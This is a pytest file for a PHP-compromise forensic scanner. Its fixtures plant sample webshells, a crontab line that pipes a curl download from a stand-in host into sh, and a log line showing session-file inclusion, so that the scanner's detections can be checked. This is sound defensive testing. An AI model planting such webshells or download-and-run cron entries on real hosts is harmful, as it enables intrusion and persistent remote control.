"""RootFS safety, verdict logic, report rendering and the full CLI in offline mode."""

import io
import json
import os

import pytest

from php2shell_scanner import cli
from php2shell_scanner.checks.common import cap_per_rule
from php2shell_scanner.fs import RootFS, dedupe_nested
from php2shell_scanner.models import Finding, Kind, Severity
from php2shell_scanner.report import TextReport, compute_verdict

from test_filesystem_checks import CHAIN_A_SESSION


# --------------------------------------------------------------------------- fs
def test_absolute_symlink_cannot_escape_root(tree, tmp_path):
    outside = tmp_path / "host_secret"
    outside.write_text("HOST")
    tree.write("/etc/real.conf", "IMAGE")
    tree.symlink(str(outside), "/etc/escape.conf")          # absolute, points outside
    tree.symlink("/etc/real.conf", "/etc/inside.conf")      # absolute, inside the image
    tree.symlink("../../../../../../..", "/etc/up")          # relative climb
    fs = RootFS(tree.root)
    assert fs.read_text("/etc/inside.conf") == "IMAGE"
    assert fs.read_text("/etc/escape.conf") is None
    assert fs.real("/etc/up/etc/real.conf") == tree.path("/etc/real.conf")


def test_walk_does_not_follow_symlinks(tree):
    tree.write("/data/a.php", "x")
    tree.symlink("/", "/data/loop")
    found = [p for p, _ in RootFS(tree.root).walk("/data")]
    assert found == ["/data/a.php"]


def test_dedupe_nested():
    assert dedupe_nested(["/var/www/html", "/var/www", "/srv/x", "/srv/x/"]) == ("/srv/x",
                                                                                 "/var/www")


# ---------------------------------------------------------------------- verdict
def f(sev, kind, rule="R", path=""):
    return Finding("t", rule, sev, kind, "title", path)


@pytest.mark.parametrize("findings, code", [
    ([], 0),
    ([f(Severity.INFO, Kind.INFO), f(Severity.LOW, Kind.EXPOSURE)], 0),
    ([f(Severity.HIGH, Kind.EXPOSURE)], 1),
    ([f(Severity.MEDIUM, Kind.ATTEMPT)], 1),
    ([f(Severity.HIGH, Kind.ATTEMPT)], 1),
    ([f(Severity.CRITICAL, Kind.ATTEMPT)], 2),
    ([f(Severity.HIGH, Kind.COMPROMISE)], 2),
    ([f(Severity.CRITICAL, Kind.COMPROMISE), f(Severity.LOW, Kind.INFO)], 3),
])
def test_verdict(findings, code):
    assert compute_verdict(findings).code == code


def test_cap_per_rule_keeps_most_severe_and_summarises():
    items = [f(Severity.LOW, Kind.ATTEMPT, "A", str(i)) for i in range(5)]
    items.append(f(Severity.HIGH, Kind.ATTEMPT, "A", "top"))
    capped = cap_per_rule(items, 2)
    assert capped[0].path == "top" and len(capped) == 3
    assert capped[-1].meta["count"] == 4
    assert cap_per_rule(items, 0) == items


def test_text_report_renders_without_color_codes():
    out = io.StringIO()
    report = TextReport(out, color=False, min_severity=Severity.INFO)
    finding = Finding("t", "R-1", Severity.CRITICAL, Kind.COMPROMISE, "Bad thing", "/x",
                      "evidence", "why " * 60, {"owner": "www-data", "mtime": "2026-10-20"})
    report.body([finding, f(Severity.INFO, Kind.INFO)])
    text = out.getvalue()
    assert "[CRITICAL] R-1  Bad thing" in text and "owner=www-data" in text
    assert "\033[" not in text and "CONTEXT" in text


# -------------------------------------------------------------------------- cli
def build_compromised(tree):
    tree.write("/var/lib/php/sessions/sess_exploitab12cd34ef56ab78cd90", CHAIN_A_SESSION)
    tree.write("/var/www/html/uploads/x.php", "<?php @eval($_POST['a']);?>")
    tree.write("/var/log/nginx/access.log",
               '203.0.113.7 - - [20/Oct/2026:13:22:01 +0000] "GET /vuln.php?page=/var/lib/php/'
               'sessions/sess_exploitab12cd34ef56ab78cd90 HTTP/1.1" 200 12 "-" "python"\n')
    tree.write("/var/spool/cron/crontabs/www-data", "* * * * * curl -s http://x.example/a|sh\n")


def test_cli_offline_compromised_host(tree, tmp_path, capsys):
    build_compromised(tree)
    report = str(tmp_path / "r.json")
    code = cli.main(["--root", tree.root, "--no-exec", "-q", "--no-color", "--json", report,
                     "--no-markdown"])
    assert code == 3
    data = json.load(open(report))
    got = {item["rule"] for item in data["findings"]}
    assert {"SESS-PHP-CODE", "SESS-POC-SID", "WEB-EVAL-INPUT", "LOG-POC-SID",
            "PERSIST-WEBUSER-CRON"} <= got
    assert data["verdict"]["label"] == "COMPROMISED"
    text = capsys.readouterr().out
    assert "VERDICT:  COMPROMISED" in text


def test_cli_clean_host(tree, capsys):
    tree.write("/var/www/html/index.php", "<?php echo 'hello';")
    tree.write("/var/log/nginx/access.log",
               '198.51.100.1 - - [20/Oct/2026:13:22:01 +0000] "GET / HTTP/1.1" 200 12 "-" "UA"\n')
    code = cli.main(["--root", tree.root, "--no-exec", "-q", "--no-color"])
    assert code == 0
    assert "NO INDICATORS FOUND" in capsys.readouterr().out


def test_cli_json_to_stdout_and_check_selection(tree, capsys):
    build_compromised(tree)
    code = cli.main(["--root", tree.root, "--no-exec", "-q", "--checks", "sessions",
                     "--json", "-"])
    data = json.loads(capsys.readouterr().out)
    assert code == 2  # session poisoning alone = exploitation attempt, not proven RCE
    assert {item["check"] for item in data["findings"]} == {"sessions"}


def test_cli_usage_errors(tree, capsys):
    assert cli.main(["--root", tree.root, "--checks", "nope"]) == cli.EXIT_USAGE
    assert cli.main(["--root", os.path.join(tree.root, "missing")]) == cli.EXIT_USAGE
    with pytest.raises(SystemExit) as exc:
        cli.main(["--since", "yesterday"])
    assert exc.value.code == cli.EXIT_USAGE


def test_failing_check_is_reported_not_fatal(tree, monkeypatch, capsys):
    from php2shell_scanner.checks import sessions

    def boom(ctx, disc):
        raise RuntimeError("disk on fire")

    monkeypatch.setattr(sessions, "run", boom)
    code = cli.main(["--root", tree.root, "--no-exec", "-q", "--no-color"])
    out = capsys.readouterr().out
    assert "check error: sessions: RuntimeError: disk on fire" in out
    assert "INCOMPLETE" in out
    assert code == cli.EXIT_INTERNAL  # nothing found + a failed check is not "clean"


# --------------------------------------------------------------------- markdown
def test_markdown_report_written_and_escaped(tree, tmp_path):
    build_compromised(tree)
    tree.write("/var/www/html/uploads/a`b|c<script>.php", "<?php system($_GET['c']);")
    out = str(tmp_path / "report.md")
    code = cli.main(["forensics", "--root", tree.root, "--no-exec", "-q", "--no-color",
                     "--markdown", out])
    assert code == 3
    text = open(out, encoding="utf-8").read()
    assert text.startswith("# php2shell-scanner forensic report")
    assert "## Verdict:" in text and "COMPROMISED" in text
    assert "SESS-PHP-CODE" in text and "https://github.com/Evil0ctal" in text
    for line in text.splitlines():
        if "a`b" in line and line.startswith("|"):
            assert "\\|c" in line              # pipe escaped inside the table cell
    assert oct(os.stat(out).st_mode & 0o777) == "0o600"


def test_default_markdown_name_in_cwd(tree):
    code = cli.main(["forensics", "--root", tree.root, "--no-exec", "-q", "--no-color"])
    assert code == 0
    names = [n for n in os.listdir(".") if n.startswith("php2shell-forensics-")]
    assert len(names) == 1 and names[0].endswith(".md")


def test_interactive_menu_runs_forensics_and_scan_requires_consent(monkeypatch, capsys):
    answers = iter(["1", "example.com", "", "n"])
    assert cli.interactive(lambda prompt: next(answers)) == cli.EXIT_USAGE
    assert "authorisation not confirmed" in capsys.readouterr().err
    assert cli.interactive(lambda prompt: "q") == 0


def test_markdown_escaping_helpers():
    from php2shell_scanner.markdown import cell, code, fenced, plain
    assert code("a`b") == "``a`b``"
    assert code("`x`") == "`` `x` ``"
    assert cell("a|b") == "`a\\|b`"
    assert plain("<img src=x onerror=alert(1)> **bold** [l](u)") == \
        "\\<img src=x onerror=alert\\(1\\)\\> \\*\\*bold\\*\\* \\[l\\]\\(u\\)"
    block = fenced("```\nbreak out")
    assert block[0] == "````text" and block[-1] == "````"
    assert "\x1b" not in code("\x1b[31m")
